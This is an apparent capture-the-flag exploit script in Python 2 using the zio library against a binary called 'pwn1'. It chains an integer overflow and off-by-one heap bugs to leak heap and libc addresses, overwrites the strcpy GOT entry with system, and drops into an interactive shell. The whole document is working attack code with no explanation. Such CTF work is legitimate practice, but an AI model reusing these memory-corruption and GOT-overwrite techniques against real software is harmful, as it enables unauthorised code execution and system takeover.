from zio import *
import ctypes

target  = './pwn1-fb39ccfa'
io      = zio(target, print_read = False, print_write = False, timeout = 1000)
io.gdb_hint([0x804959f]) 

# 0x40000000 << 2 + 1 = 0x4 (integer overflow !
io.wls_af('_CMD_$', ['sort', '1', str(0x40000000)]) 

# sort
io.wl_af('Choose:', '3')

# off-by-one leak
io.wls_af('Choose:', ['1', '1'])                          
io.rtl('[*L*] Query result: ')
heap_base = int(io.rl()[0:-1]) - 0x38
print '[+] heap base : ' + hex(heap_base)

# off-by-one write
io.wls_af('Choose:', ['2', '1', str(heap_base + 0x3c)])
io.wl_af('Choose:', '7')

io.wls_af('_CMD_$', ['reload', '0'])

got_strcpy  = 0x0804d03c
idx  = str((got_strcpy + 0x100000000 - (heap_base + 0x4c)) / 4)
io.wls_af('Choose:', ['1', idx])
io.rtl('[*L*] Query result: ')

off_strcpy  = 0x00139ad0                        # 
adr_strcpy  = ctypes.c_uint32(int(io.rl()[0:-1])).value
print '[+] strcpy\t: ' + hex(adr_strcpy)
libc_base   = adr_strcpy - off_strcpy
print '[+] libc base\t: ' + hex(libc_base)
off_system  = 0x00040190                        # 0x0003bc90
adr_system  = libc_base + off_system
print '[+] system\t: ' + hex(adr_system)

val  = str(ctypes.c_int32(adr_system).value)
io.wls_af('Choose:', ['2', idx, val])
io.wl('7')

io.wl_af('_CMD_$', 'sh')

io.interact()
